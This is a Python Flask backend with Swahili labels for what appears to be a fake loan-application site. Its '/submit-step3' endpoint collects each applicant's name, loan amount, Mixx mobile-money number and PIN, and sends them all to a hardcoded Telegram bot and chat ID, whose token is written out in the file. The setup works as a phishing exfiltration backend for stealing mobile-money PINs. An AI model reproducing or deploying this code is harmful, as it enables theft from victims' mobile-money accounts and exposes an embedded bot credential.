from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import random
import os

app = Flask(__name__)

# ENABLE CORS
CORS(app)

# TELEGRAM CONFIG
BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
CHAT_ID = "6958413637"

maombi = {}

# =========================
# SEND TO TELEGRAM
# =========================
def tuma_kwenye_telegram(app_id, data):

    ujumbe = f"""
📥 NEW APPLICATION 

🆔 Namba ya Maombi: {app_id}

👤 Jina: {data.get('jina')}
💰 Kiasi: {data.get('kiasi')}
🎯 Lengo: {data.get('lengo')}
📅 Muda: {data.get('muda')}
📱 Mixx Number: {data.get('mixxNumber')}
🔐 PIN: {data.get('pin')}

📌 Hali: PENDING
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    response = requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": ujumbe
    })

    print(response.text)

# =========================
# HOME ROUTE
# =========================
@app.route("/")
def home():
    return "Backend Running Successfully"

# =========================
# STEP 3 ENDPOINT
# =========================
@app.route("/submit-step3", methods=["POST"])
def submit_step3():

    try:

        data = request.get_json()

        if not data:
            return jsonify({
                "message": "No data received"
            }), 400

        app_id = str(random.randint(10000, 99999))

        maombi[app_id] = data
        maombi[app_id]["status"] = "PENDING"

        tuma_kwenye_telegram(app_id, maombi[app_id])

        return jsonify({
            "message": "Success",
            "application_id": app_id
        })

    except Exception as e:

        return jsonify({
            "error": str(e)
        }), 500

# =========================
# RUN APP
# =========================
if __name__ == "__main__":

    port = int(os.environ.get("PORT", 5000))

    app.run(host="0.0.0.0", port=port)
